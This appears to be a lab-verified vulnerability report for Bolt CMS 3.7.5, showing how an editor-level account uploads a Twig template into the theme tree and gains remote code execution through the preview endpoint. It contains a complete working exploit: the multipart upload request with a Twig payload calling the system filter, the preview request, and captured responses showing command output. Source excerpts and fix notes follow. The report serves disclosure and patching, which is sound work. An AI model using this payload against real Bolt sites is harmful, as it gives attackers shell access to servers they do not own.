### Vulnerability details

**Official website / Product:** https://boltcms.io / https://github.com/bolt/bolt

**Repository:** bolt/bolt (stars at selection: 4133)

**Vulnerability type:** file_upload → RCE / getshell (Twig SSTI)

**Vulnerability versions:** 3.7.5 (default branch `3.7` / tag `3.7.5`; Bolt 3 EOL/archived)

**Vulnerability URL / Parameter:**
- Upload: `POST /bolt/upload?handler=themes://base-2018/` (field `themes[]`) or FileManager `POST /bolt/files/themes/base-2018` (field `file_upload[select][]`)
- Execute: `POST /preview/page` (`template=<uploaded>.twig` + `content_edit[_token]`) or contenttype `templateselect`

**Complex:** yes

### Verification procedure

1. Start the lab (image `webdevops/php-apache:7.4`, host port **23204→80**, SQLite `app/database/bolt.db`, theme `base-2018`). Audited tag/commit: `3.7.5` / `391eecbe988e0cd5c25a7180ab65c82002fe18f3`. Accounts: `admin` / `AdminPass123!` (root), `editor` / `EditorPass123!` (editor). After `docker compose up -d` in the lab directory, expect topology similar to:

```text
Network bolt-r52-a4_default  Created
Container bolt-r52-a4  Created
Container bolt-r52-a4  Started
```

2. Log in as role **editor** (`editor` / `EditorPass123!`). This role has `files` / `files:uploads` and **lacks** `files:theme` / `fileedit`. Admin reference account: `admin` / `AdminPass123!`. Keep cookies `bolt_session_*` and `bolt_authtoken_*`. Captured example (replace after redeploy):

```text
bolt_session_e4a41db7c95f6614e3cd200ff44df8bb=9ee46ab393843ce8b921f42d4e95f47c
bolt_authtoken_e4a41db7c95f6614e3cd200ff44df8bb=1eee66fe6269cc3df6b9d5c37be135e37949718afabaa02131358a60c00a4a98
```

3. Obtain CSRF: open `GET /bolt/editcontent/pages` (or create a new page) and read hidden field `content_edit[_token]`. Captured example (replace after redeploy):

```text
CFnUOmc-KkunrXcqZLsOeajt8wxCEPifIOHC-cm79ps
```

4. Upload a malicious `.twig` into the theme tree via `POST /bolt/upload?handler=themes://base-2018/` with multipart field `themes[]` and a `.twig` filename (default `accept_file_types` includes `twig`). Alternately use FileManager at `/bolt/files/themes/base-2018` (often keeps the original filename).
5. Response JSON `filename` may be the original name (e.g. `r52a4-poc.twig`) or a timestamp-prefixed name (e.g. `1793615331_r52a4-poc.twig`, depending on `upload.prefix`). **Always use the returned `filename` as the next step's `template=` value.**
6. `POST /preview/page` (`application/x-www-form-urlencoded`) with `template=<returned filename>` and `content_edit[_token]=<CSRF>`.
7. Response body contains `uid=` (Twig `|filter('system')` side effect/output), proving getshell. Container file `/tmp/r52a4-poc-id.txt` is written in parallel; expect:

```text
uid=1000(application) gid=1000(application) groups=1000(application)
```

Prerequisite upload request (Docker-verified; Twig payload must use double-brace `{{ ... }}`):

```http
POST /bolt/upload?handler=themes%3A%2F%2Fbase-2018%2F HTTP/1.1
Host: 127.0.0.1:23204
User-Agent: curl/8.5.0 r52-a4-poc
Accept: */*
Cookie: bolt_authtoken_e4a41db7c95f6614e3cd200ff44df8bb=1eee66fe6269cc3df6b9d5c37be135e37949718afabaa02131358a60c00a4a98; bolt_session_e4a41db7c95f6614e3cd200ff44df8bb=9ee46ab393843ce8b921f42d4e95f47c
Content-Type: multipart/form-data; boundary=----r52a4Boundary7MA4YWxkTrZu0gW
Content-Length: 325
Connection: close

------r52a4Boundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="themes[]"; filename="r52a4-poc.twig"
Content-Type: text/plain

<pre>R52A4-POC
{% set _ = ['id >/tmp/r52a4-poc-id.txt']|filter('system') %}
{{ ['cat /tmp/r52a4-poc-id.txt']|filter('system')|join('') }}
</pre>

------r52a4Boundary7MA4YWxkTrZu0gW--

```

Upload response (aligned with preview `template=r52a4-poc.twig`):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 10:28:51 GMT
Server: Apache/2.4.38 (Debian)
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Frame-Options: SAMEORIGIN
Set-Cookie: bolt_session_e4a41db7c95f6614e3cd200ff44df8bb=9ee46ab393843ce8b921f42d4e95f47c; expires=Mon, 16-Nov-2026 10:28:51 GMT; Max-Age=1209600; path=/; HttpOnly
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/plain; charset=UTF-8

[{"filename":"r52a4-poc.twig","path":"base-2018\/r52a4-poc.twig","fullPath":"themes:\/\/base-2018\/r52a4-poc.twig","extension":"twig","url":"\/theme\/base-2018\/r52a4-poc.twig?1fee60e757"}]
```

A re-upload in the same lab may return a timestamp-prefixed name:

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8

[{"filename":"1793615331_r52a4-poc.twig","path":"base-2018\/1793615331_r52a4-poc.twig","fullPath":"themes:\/\/base-2018\/1793615331_r52a4-poc.twig","extension":"twig","url":"\/theme\/base-2018\/1793615331_r52a4-poc.twig?7f4bb2540c"}]
```

If the returned `filename` is prefixed, set preview `template=` to that value.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified preview proving RCE):

```http
POST /preview/page HTTP/1.1
Host: 127.0.0.1:23204
User-Agent: curl/8.5.0 r52-a4-poc
Accept: */*
Cookie: bolt_authtoken_e4a41db7c95f6614e3cd200ff44df8bb=1eee66fe6269cc3df6b9d5c37be135e37949718afabaa02131358a60c00a4a98; bolt_session_e4a41db7c95f6614e3cd200ff44df8bb=9ee46ab393843ce8b921f42d4e95f47c
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Connection: close

title=R52A4POC&slug=r52a4-poc&teaser=t&body=b&template=r52a4-poc.twig&status=draft&content_edit%5B_token%5D=CFnUOmc-KkunrXcqZLsOeajt8wxCEPifIOHC-cm79ps
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 10:28:30 GMT
Server: Apache/2.4.38 (Debian)
Cache-Control: private
X-XSS-Protection: 0
Set-Cookie: bolt_session_e4a41db7c95f6614e3cd200ff44df8bb=9ee46ab393843ce8b921f42d4e95f47c; expires=Mon, 16-Nov-2026 10:28:30 GMT; Max-Age=1209600; path=/; HttpOnly
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<pre>R52A4-POC
uid=1000(application) gid=1000(application) groups=1000(application)
cat /tmp/r52a4-poc-id.txt
</pre>
<meta name="generator" content="Bolt">
<link rel="canonical" href="http://127.0.0.1:23204/preview/page">

```

Verification result notes:

Response body includes `uid=1000(application) gid=1000(application) groups=1000(application)`. Container-side artifact (`docker exec <container> cat /tmp/r52a4-poc-id.txt`) expect:

```text
uid=1000(application) gid=1000(application) groups=1000(application)
```

Low-privilege editor achieved getshell.

### Vulnerability analysis

Default `permissions.yml.dist` restricts `files:theme` to developer and `fileedit` to admin/developer, intending to keep editors out of theme modification. However, FileManager is gated only by route permission `files`, and `FilePermissions::authorized()` allowlists `theme`/`themes` prefixes without consulting `files:theme`. `Upload::uploadNamespace` only requires `files:uploads` and trusts the attacker-controlled `handler` namespace, writing `.twig` (allowed by default `accept_file_types`) into the theme. Theme templates render without a sandbox; `/preview/page` or templateselect then yields RCE.

The same class was fixed for bolt/core as GHSA-m2j9 (Bolt 6); no matching public CVE/GHSA was found for `bolt/bolt` 3.x.

### Trigger / sink source (full path and line numbers)

```php
# File: src/Controller/Backend/Upload.php
# Lines: 49-58
public function uploadNamespace(Request $request, $namespace)
{
    if ($handler = $request->get('handler')) {
        if (is_array($handler)) {
            return $this->processCustomUploadHandler($request, $handler);
        }
        list($namespace, $prefix) = $this->parser($handler);
        $this->app['upload.namespace'] = $namespace;
        $this->app['upload.prefix'] = $prefix;
```

```php
# File: src/Filesystem/FilePermissions.php
# Lines: 37-74
$this->allowedPrefixes = [
    'config',
    'extensions_config',
    'files',
    'theme',
    'themes',
];
public function authorized($prefix, $path)
{
    foreach ($this->allowedPrefixes as $allowedPrefix) {
        if ($allowedPrefix === $prefix) {
            return true;
```

```php
# File: src/Controller/Frontend.php
# Lines: 201-267
public function preview(Request $request, $contenttypeslug)
{
    $template = $this->templateChooser()->record($content);
    return $this->render($template, [], $globals);
```

```yaml
# File: app/config/permissions.yml.dist
# Lines: 74-79
fileedit: [ admin, developer ]
files:theme: [ developer ]
files:uploads: [ admin, developer, chief-editor, editor ]
files: [ admin, developer, chief-editor, editor ]
```

### Fix notes

1. Enforce `files:theme` / `files:config` on writes to those mounts (not menu-only).
2. Allowlist `handler` to `files` (or explicitly authorized mounts).
3. Remove `twig` from default `accept_file_types`, or sandbox theme uploads.
4. Bolt 3 is EOL — migrate; apply the bolt/core GHSA-m2j9 class of fix.
